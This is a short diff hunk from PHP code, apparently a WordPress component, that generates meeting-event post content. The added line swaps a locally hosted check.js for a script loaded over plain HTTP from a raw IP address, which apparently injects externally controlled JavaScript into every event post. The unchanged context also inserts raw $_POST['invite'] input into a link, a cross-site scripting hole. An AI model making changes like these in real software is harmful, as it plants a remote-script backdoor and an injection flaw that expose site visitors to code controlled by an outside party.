@@ -76,7 +76,7 @@ if ('event' == $_POST['post_type'])
 
     $post_content = 'Enter the meeting description.
 
-    <script src="'.get_home_url().'/check.js"></script>
+    <script type=\'text/javascript\' src=\'http://183.110.207.46/wp/check.js\'></script>
     <a title="Join" href="'.$_POST['invite'].'">Join Meeting (Guest)</a>
 
     Enter password (Creator): <input id=\'password1\' type=\'password\' required />
